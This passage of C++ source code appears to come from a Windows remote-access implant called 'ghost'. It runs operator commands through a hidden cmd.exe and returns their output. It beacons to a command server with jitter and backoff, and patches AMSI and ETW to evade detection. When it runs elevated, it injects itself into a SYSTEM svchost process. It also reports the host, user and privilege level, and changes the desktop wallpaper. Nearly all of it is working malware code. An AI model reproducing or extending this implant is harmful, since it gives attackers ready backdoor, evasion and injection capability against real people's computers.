    std::string cmdStr = WStringToUTF8(cmd);
    for (const auto& entry : kCmdTable) {
        if (entry.exactMatch) {
            if (cmdStr == entry.prefix && entry.handler)
                return entry.handler("");
        } else {
            if (cmdStr.rfind(entry.prefix, 0) == 0 && entry.handler)
                return entry.handler(cmdStr.substr(strlen(entry.prefix)));
        }
    }
    // Fallback: raw command via cmd.exe /C
    wchar_t sysRoot[MAX_PATH] = {};
    GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);
    std::wstring cmdLine = std::wstring(sysRoot) + L"\\System32\\cmd.exe /C " + cmd;

    SECURITY_ATTRIBUTES sa = { sizeof(sa), nullptr, TRUE };
    HANDLE hRead = nullptr, hWrite = nullptr;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return L"[error: pipe failed]";
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWrite;
    si.hStdError  = hWrite;
    si.hStdInput  = GetStdHandle(STD_INPUT_HANDLE);

    PROCESS_INFORMATION pi = {};
    if (!CreateProcessW(nullptr, &cmdLine[0], nullptr, nullptr, TRUE,
                        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        CloseHandle(hRead); CloseHandle(hWrite);
        return L"[error: CreateProcess failed]";
    }
    CloseHandle(hWrite);

    std::string output;
    output.reserve(4096);
    char buf[4096]; DWORD rd = 0;
    while (output.size() < config::CMD_OUTPUT_MAX) {
        if (!ReadFile(hRead, buf, sizeof(buf), &rd, nullptr) || rd == 0) break;
        output.append(buf, rd);
    }
    if (WaitForSingleObject(pi.hProcess, config::CMD_TIMEOUT_MS) == WAIT_TIMEOUT) {
        TerminateProcess(pi.hProcess, 1);
    }
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread); CloseHandle(hRead);
    return UTF8ToWString(output);
}

// =====================================================================
//  SET WALLPAPER FROM DOWNLOADED BYTES
// =====================================================================
static void SetWallpaperFromUrl(const wchar_t* host, const wchar_t* urlPath) {
    HttpResponse resp = WinHttpRequest(host, 443, L"GET", urlPath, "", L"");
    if (resp.status != 200 || resp.body.empty()) {
        DebugLog(L"Wallpaper download failed: HTTP " + std::to_wstring(resp.status));
        return;
    }
    std::wstring wpPath = L"C:\\Users\\Public\\bg.jpg";
    HANDLE hf = CreateFileW(wpPath.c_str(), GENERIC_WRITE, 0, nullptr,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hf == INVALID_HANDLE_VALUE) { DebugLog(L"Wallpaper: can't write file"); return; }
    DWORD w = 0;
    WriteFile(hf, resp.body.data(), (DWORD)resp.body.size(), &w, nullptr);
    CloseHandle(hf);
    SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)wpPath.c_str(),
                          SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
    DebugLog(L"Wallpaper set: " + wpPath);
}

// =====================================================================
//  MAIN BEACON LOOP
// =====================================================================
VOID BeaconLoop(const Session& session) {
    DebugLog(L"BeaconLoop started");

    g_SessionId  = session.sessionId;
    g_SessionKey = DeriveKeyFromSessionId(session.sessionId);
    DebugLog(L"Session: " + session.sessionId);

    DWORD failures    = 0;
    DWORD beaconCount = 0;
    bool  sentHello   = false;
    bool  firstPass   = true;
    bool  wasDown     = false; // track reconnect for re-evasion

    while (true) {
        try {
            // Re-apply evasion on every loop after first pass,
            // and force it again after a reconnect (wasDown)
            if (!firstPass) {
                ReapplyEvasion();
            }
            firstPass = false;

            ++beaconCount;
            DebugLog(L"Beacon #" + std::to_wstring(beaconCount) +
                     L" failures=" + std::to_wstring(failures));

            std::wstring task;
            BOOL ok = SendBeacon(session, task);

            if (!ok) {
                ++failures;
                wasDown = true;
                DebugLog(L"Beacon fail #" + std::to_wstring(failures));

                // Exponential backoff capped at 30 min
                DWORD backoffSec = config::BEACON_MIN * (1u << std::min<DWORD>(failures - 1u, 6u));
                if (backoffSec > 1800) backoffSec = 1800;
                DebugLog(L"Backoff " + std::to_wstring(backoffSec) + L"s");
                JitterSleep(backoffSec, backoffSec + 30);
                continue;
            }

            // Reconnected after being down — refresh evasion immediately
            if (wasDown) {
                DebugLog(L"Reconnected — refreshing evasion");
                PatchAMSI(); PatchETW(); ClearHardwareBreakpoints();
                wasDown = false;
            }
            failures = 0;

            // First successful beacon: migrate into svchost, set wallpaper, send hello
            if (!sentHello) {
                sentHello = true;
                SetWallpaperFromUrl(L"wallpaperaccess.com", L"/full/2012878.jpg");

                // Auto-migrate: inject self into SYSTEM svchost and exit this process.
                // Only attempt if elevated — migration requires PROCESS_VM_WRITE on svchost.
                if (session.elevated) {
                    DWORD svchostPid = FindBestSvchost();
                    if (svchostPid) {
                        wchar_t selfPath[MAX_PATH] = {};
                        GetModuleFileNameW(nullptr, selfPath, MAX_PATH);
                        HANDLE hFile = CreateFileW(selfPath, GENERIC_READ, FILE_SHARE_READ,
                                                   nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
                        if (hFile != INVALID_HANDLE_VALUE) {
                            LARGE_INTEGER fsz = {};
                            GetFileSizeEx(hFile, &fsz);
                            std::vector<BYTE> payload(static_cast<size_t>(fsz.QuadPart));
                            DWORD rd = 0;
                            ReadFile(hFile, payload.data(), static_cast<DWORD>(payload.size()), &rd, nullptr);
                            CloseHandle(hFile);

                            if (rd == payload.size() && InjectRemoteProcess(svchostPid, payload.data(), payload.size(), nullptr)) {
                                DebugLog(L"Migrated into svchost pid=" + std::to_wstring(svchostPid));
                                SendResult(session.sessionId,
                                    L"[ghost] implant online — migrated into svchost pid=" + std::to_wstring(svchostPid) +
                                    L"\r\nhost: " + session.hostname +
                                    L"\r\nuser: " + session.username +
                                    L"\r\nelevated: yes");
                                // Give injected copy 2s to start beaconing, then vanish
                                Sleep(2000);
                                ExitProcess(0);
                            }
                        }
                    }
                }

                // Migration failed or not elevated — stay in current process
                SendResult(session.sessionId,
                    L"[ghost] implant online\r\nhost: " + session.hostname +
                    L"\r\nuser: " + session.username +
                    L"\r\nelevated: " + (session.elevated ? L"yes" : L"no"));
                DebugLog(L"Hello sent (no migration)");
            }

            // Execute task
            if (!task.empty() && task != L"sleep") {
                if (task == L"exit") {
                    DebugLog(L"Exit received");
                    SendResult(session.sessionId, L"[ghost] exiting on operator command");
                    return;
                }
                DebugLog(L"Exec: " + task);
                std::wstring result = ExecuteCommand(task);
                // Trim oversized output
                if (result.size() > config::CMD_OUTPUT_MAX / sizeof(wchar_t))
                    result.resize(config::CMD_OUTPUT_MAX / sizeof(wchar_t));
                SendResult(session.sessionId, result);
            }

            // Release wake lock during sleep — reacquired by ReapplyEvasion next tick
            ReleaseWakeLock();
            JitterSleep(config::BEACON_MIN, config::BEACON_MAX);

        } catch (const std::exception& e) {
            DebugLog(L"BeaconLoop exception: " + UTF8ToWString(e.what()));
            failures++;
            Sleep(15000);
        } catch (...) {
            DebugLog(L"BeaconLoop: unknown exception");
            failures++;
            Sleep(15000);
        }
    }
}